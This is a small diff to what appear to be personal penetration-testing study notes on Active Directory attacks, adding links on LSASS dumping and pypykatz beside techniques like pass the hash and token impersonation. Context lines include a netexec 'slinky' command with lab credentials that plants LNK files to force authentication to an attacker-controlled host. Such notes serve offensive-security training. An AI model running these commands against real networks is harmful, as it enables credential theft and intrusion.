@@ -13,6 +13,7 @@
 - [Pass the hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key)
 - [IPv6 AD Attack (mitm)](https://stridergearhead.medium.com/ipv6-attack-ad-attack-ea50476dccee)
 - [Passback attacks](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
+- [Attacking LSASS](./lsass.md)
 - others that i didn't take notes
 
 ### Initial internal pentest attack strategy
@@ -54,6 +55,7 @@
 - Token impersonation attack
     - psexec
     - mimikatz
+    - [pypykatz](./pypykatz.md)
 - [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`
     - Código:
 
